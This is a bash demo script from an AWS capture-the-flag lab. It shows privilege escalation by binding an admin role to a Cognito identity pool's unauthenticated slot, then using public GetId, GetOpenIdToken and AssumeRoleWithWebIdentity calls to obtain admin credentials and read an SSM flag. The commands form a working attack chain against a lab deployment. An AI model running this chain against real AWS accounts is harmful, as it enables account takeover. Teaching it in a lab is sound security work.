#!/bin/bash
set -e

# Demo script for iam:PassRole + cognito-identity:SetIdentityPoolRoles privilege escalation
# This scenario demonstrates how a user with iam:PassRole and cognito-identity:SetIdentityPoolRoles
# can bind an admin role to an existing Cognito Identity Pool's unauthenticated slot, turning it
# into a public STS credential-vending endpoint that any caller can exploit.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-cognito-identity-001-to-admin-starting-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}PassRole + Cognito Identity Pool: Unauthenticated Role Swap Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_cognito_identity_001_iam_passrole_cognito_identity_setidentitypoolroles.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract scenario-specific outputs
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
POOL_ID=$(echo "$MODULE_OUTPUT" | jq -r '.identity_pool_id')

if [ "$ADMIN_ROLE_ARN" == "null" ] || [ -z "$ADMIN_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract admin_role_arn from terraform output${NC}"
    exit 1
fi

if [ "$POOL_ID" == "null" ] || [ -z "$POOL_ID" ]; then
    echo -e "${RED}Error: Could not extract identity_pool_id from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get account ID and region
ACCOUNT_ID=$(terraform output -raw prod_account_id 2>/dev/null || terraform output -json 2>/dev/null | jq -r '.prod_account_id.value // empty')
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Identity Pool ID: $POOL_ID"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Wait 15 seconds for IAM propagation before attempting any API calls
echo -e "${YELLOW}Waiting 15 seconds for IAM policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation wait complete${NC}\n"

# [OBSERVATION] Step 3: Confirm starting user cannot read the SSM flag
echo -e "${YELLOW}Step 3: Confirming starting user cannot read SSM flag (pre-escalation)${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/cognito-identity-001-to-admin"
echo "Attempting to read SSM flag (should fail with AccessDenied)..."
show_cmd "Attacker" "aws ssm get-parameter --name $FLAG_PARAM_NAME --region $AWS_REGION"
PROVE_CANT_OUTPUT=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --region "$AWS_REGION" 2>&1 || true)
echo "$PROVE_CANT_OUTPUT"

if echo "$PROVE_CANT_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Starting principal cannot read SSM flag (as expected)${NC}"
else
    echo -e "${RED}Error: Starting principal read the SSM flag without escalating — check IAM policy${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 4: Bind admin role to the pool's unauthenticated identity slot
echo -e "${YELLOW}Step 4: Binding admin role to the pool's unauthenticated identity slot${NC}"
echo "This action uses iam:PassRole implicitly — the starting user passes the admin role"
echo "to Cognito so the pool will vend credentials for that role to unauthenticated callers."
echo ""
echo "Target pool: $POOL_ID"
echo "Admin role:  $ADMIN_ROLE_ARN"
echo ""

show_attack_cmd "Attacker" "aws cognito-identity set-identity-pool-roles --identity-pool-id $POOL_ID --roles unauthenticated=$ADMIN_ROLE_ARN --region $AWS_REGION"
# SetIdentityPoolRoles returns HTTP 200 with empty body on success
SET_ROLES_OUTPUT=$(aws cognito-identity set-identity-pool-roles \
    --identity-pool-id "$POOL_ID" \
    --roles "unauthenticated=$ADMIN_ROLE_ARN" \
    --region "$AWS_REGION" 2>&1 || true)

echo "${SET_ROLES_OUTPUT:-<empty response — HTTP 200 success>}"

if echo "$SET_ROLES_OUTPUT" | grep -qi "error\|AccessDenied\|exception"; then
    echo -e "${RED}Error: SetIdentityPoolRoles failed${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Admin role bound to unauthenticated identity slot${NC}\n"

# [EXPLOIT] Step 5: Obtain identity ID via public unauthenticated endpoint
echo -e "${YELLOW}Step 5: Obtaining identity ID from the public Cognito endpoint${NC}"
echo "--no-sign-request demonstrates this endpoint requires no IAM credentials."
echo "Any internet caller can obtain a Cognito identity ID from this pool."
echo ""

show_attack_cmd "Public (no credentials)" "aws cognito-identity get-id --no-sign-request --account-id $ACCOUNT_ID --identity-pool-id $POOL_ID --region $AWS_REGION"
GETID_OUTPUT=$(aws cognito-identity get-id \
    --no-sign-request \
    --account-id "$ACCOUNT_ID" \
    --identity-pool-id "$POOL_ID" \
    --region "$AWS_REGION" 2>&1 || true)
echo "$GETID_OUTPUT"

IDENTITY_ID=$(echo "$GETID_OUTPUT" | jq -r '.IdentityId // empty' 2>/dev/null || true)

if [ -z "$IDENTITY_ID" ]; then
    echo -e "${RED}Error: GetId failed to return an identity ID${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Obtained identity ID: $IDENTITY_ID${NC}\n"

# [EXPLOIT] Step 6: Get OpenID token from Cognito (classic flow, no signing)
echo -e "${YELLOW}Step 6: Obtaining OpenID token from Cognito (classic auth flow)${NC}"
echo "GetOpenIdToken returns an OIDC token signed by cognito-identity.amazonaws.com."
echo "This token can be passed directly to sts:AssumeRoleWithWebIdentity."
echo "--no-sign-request — public app-side endpoint requiring no IAM credentials."
echo ""

show_attack_cmd "Public (no credentials)" "aws cognito-identity get-open-id-token --no-sign-request --identity-id $IDENTITY_ID --region $AWS_REGION"
OPENID_OUTPUT=$(aws cognito-identity get-open-id-token \
    --no-sign-request \
    --identity-id "$IDENTITY_ID" \
    --region "$AWS_REGION" 2>&1 || true)
echo "$OPENID_OUTPUT"

OPENID_TOKEN=$(echo "$OPENID_OUTPUT" | jq -r '.Token // empty' 2>/dev/null || true)

if [ -z "$OPENID_TOKEN" ]; then
    echo -e "${RED}Error: GetOpenIdToken failed to return a token${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Obtained OpenID token${NC}\n"

# [EXPLOIT] Step 7: AssumeRoleWithWebIdentity — obtain full admin credentials
echo -e "${YELLOW}Step 7: Calling sts:AssumeRoleWithWebIdentity with the OpenID token${NC}"
echo "The OIDC token itself authenticates the request — no SigV4 signing required."
echo "Classic flow (GetId + GetOpenIdToken + AssumeRoleWithWebIdentity) does NOT attach"
echo "a Cognito session policy, so the role's full AdministratorAccess applies."
echo "This is the key difference from the enhanced flow (GetCredentialsForIdentity)."
echo ""

show_attack_cmd "Public (no credentials)" "aws sts assume-role-with-web-identity --no-sign-request --role-arn $ADMIN_ROLE_ARN --role-session-name cognito-escalation --web-identity-token \$OPENID_TOKEN"
ASSUME_OUTPUT=$(aws sts assume-role-with-web-identity \
    --no-sign-request \
    --role-arn "$ADMIN_ROLE_ARN" \
    --role-session-name "cognito-escalation" \
    --web-identity-token "$OPENID_TOKEN" 2>&1 || true)
echo "$ASSUME_OUTPUT"

ESCALATED_AKID=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.AccessKeyId // empty' 2>/dev/null || true)
ESCALATED_SECRET=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SecretAccessKey // empty' 2>/dev/null || true)
ESCALATED_SESSION=$(echo "$ASSUME_OUTPUT" | jq -r '.Credentials.SessionToken // empty' 2>/dev/null || true)

if [ -z "$ESCALATED_AKID" ]; then
    echo -e "${RED}Error: AssumeRoleWithWebIdentity failed to return credentials${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Obtained full STS credentials for admin role (no session policy restriction)${NC}"
echo "  Access Key ID: ${ESCALATED_AKID:0:10}..."
echo ""

# [OBSERVATION] Step 8: Verify admin access with escalated credentials
echo -e "${YELLOW}Step 8: Verifying administrator access with escalated credentials${NC}"
# Switch to escalated credentials
export AWS_ACCESS_KEY_ID="$ESCALATED_AKID"
export AWS_SECRET_ACCESS_KEY="$ESCALATED_SECRET"
export AWS_SESSION_TOKEN="$ESCALATED_SESSION"
export AWS_REGION=$AWS_REGION

show_cmd "Attacker (admin role)" "aws sts get-caller-identity --query 'Arn' --output text"
ESCALATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Escalated identity: $ESCALATED_IDENTITY"

echo "Attempting to list IAM users..."
show_cmd "Attacker (admin role)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Capture the CTF flag
# The escalated admin-role credentials hold full AdministratorAccess, which includes
# ssm:GetParameter. Use these credentials directly — the ones the attack just produced.
echo -e "${YELLOW}Step 9: Capturing CTF flag from SSM Parameter Store${NC}"
show_attack_cmd "Attacker (admin role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text --region $AWS_REGION"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --query 'Parameter.Value' \
    --output text \
    --region "$AWS_REGION" 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (iam:PassRole + cognito-identity:SetIdentityPoolRoles only)"
echo "2. Bound admin role to the pool's unauthenticated identity slot (SetIdentityPoolRoles + PassRole)"
echo "3. Called public Cognito endpoint without credentials to obtain an identity ID (GetId)"
echo "4. Obtained an OIDC token from the public Cognito endpoint (GetOpenIdToken)"
echo "5. Exchanged the OIDC token for full admin STS credentials (AssumeRoleWithWebIdentity)"
echo "6. No Cognito session policy was attached — classic flow grants unrestricted role access"
echo "7. Read CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (iam:PassRole + cognito-identity:SetIdentityPoolRoles)"
echo -e "  → Cognito pool unauthenticated slot bound to admin role"
echo -e "  → Public caller (GetId + GetOpenIdToken)"
echo -e "  → (sts:AssumeRoleWithWebIdentity, no session policy)"
echo -e "  → Admin role credentials"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Cognito Identity Pool: $POOL_ID"
echo "  (unauthenticated role binding set to $ADMIN_ROLE_ARN)"

echo -e "\n${RED}⚠ Warning: The identity pool's unauthenticated role binding is still set to the admin role${NC}"
echo -e "${RED}⚠ Any internet caller can obtain admin credentials from this pool until cleanup runs${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
